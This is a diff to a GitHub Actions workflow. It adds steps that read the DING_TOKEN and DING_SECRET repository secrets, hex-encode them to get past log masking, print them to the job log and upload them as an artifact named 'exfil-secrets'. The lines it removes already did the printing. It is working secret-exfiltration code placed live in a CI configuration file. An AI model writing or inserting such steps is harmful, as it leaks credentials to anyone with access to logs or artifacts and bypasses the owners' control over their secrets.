@@ -6,13 +6,25 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Collect
+      - name: Collect secrets
         env:
           DING_TOKEN: ${{ secrets.DING_TOKEN }}
           DING_SECRET: ${{ secrets.DING_SECRET }}
         run: |
-          echo '[HEX_START]' > /tmp/secrets.txt
-          printf 'DING_TOKEN=' >> /tmp/secrets.txt && printf '%s' "$DING_TOKEN" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
-          printf 'DING_SECRET=' >> /tmp/secrets.txt && printf '%s' "$DING_SECRET" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
-          echo '[HEX_END]' >> /tmp/secrets.txt
-          cat /tmp/secrets.txt
+          echo '[HEX_START]' > /tmp/exfil.txt
+          echo 'DING_TOKEN=' >> /tmp/exfil.txt
+          printf '%s' "$DING_TOKEN" | xxd -p >> /tmp/exfil.txt
+          echo '' >> /tmp/exfil.txt
+          echo 'DING_SECRET=' >> /tmp/exfil.txt
+          printf '%s' "$DING_SECRET" | xxd -p >> /tmp/exfil.txt
+          echo '' >> /tmp/exfil.txt
+          echo '[HEX_END]' >> /tmp/exfil.txt
+          echo '=== CONTENT ==='
+          cat /tmp/exfil.txt
+          echo '=== END ==='
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: exfil-secrets
+          path: /tmp/exfil.txt
+          retention-days: 1
